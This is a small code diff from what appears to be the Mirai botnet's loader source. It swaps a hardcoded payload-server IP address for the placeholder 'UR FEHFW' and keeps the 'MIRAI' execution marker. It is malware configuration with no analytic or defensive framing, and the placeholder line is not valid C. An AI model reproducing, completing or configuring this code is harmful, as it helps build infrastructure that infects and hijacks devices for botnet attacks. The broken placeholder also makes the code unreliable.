@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(46.17.45.121)
+#define HTTP_SERVER utils_inet_addr(UR FEHFW)
 
 #define EXEC_MSG            "MIRAI\n"
 #define EXEC_MSG_LEN        6
